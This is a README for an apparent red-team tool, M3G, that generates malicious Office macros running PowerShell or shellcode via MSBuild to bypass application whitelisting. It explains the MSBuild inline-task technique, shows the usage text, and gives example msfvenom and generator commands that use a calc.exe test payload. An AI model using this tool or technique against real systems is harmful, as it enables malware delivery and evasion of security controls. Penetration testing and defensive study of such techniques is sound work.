# Malicious Macro MSBuild Generator

## Description
Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass.

## What is MSBuild

MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations.  

Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file.  

MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution.

## Usage
```
usage: M3G.py [-h] -i INPUTFILE -p PAYLOAD -o OUTPUT

M3G - Malicious Macro MSBuild Generator v1.0
Author : Rahmat Nurfauzi (@infosecn1nja)

optional arguments:
  -h, --help            show this help message and exit
  -i INPUTFILE, --inputfile INPUTFILE
                        Input file you want to embed into the macro
  -p PAYLOAD, --payload PAYLOAD
                        Choose a payload for powershell or raw shellcode
  -o OUTPUT, --output OUTPUT
                        Output filename for the macro
```

## Example
* Choose a payload you want to test like shellcode or powershell
* Generate a raw shellcode in whatever framework you want (Cobalt Strike, Metasploit Framework)

`$ msfvenom -p windows/exec cmd="calc.exe" -f raw > payload.bin`  
`$ python M3G.py -p shellcode -i /path/payload.bin -o macro.vba`  
`$ python M3G.py -p powershell -i /path/payload.ps1 -o macro.vba`

## Links

* https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
* http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html
* https://msdn.microsoft.com/en-us/library/dd722601.aspx

## Credit
Rahmat Nurfauzi (@infosecn1nja)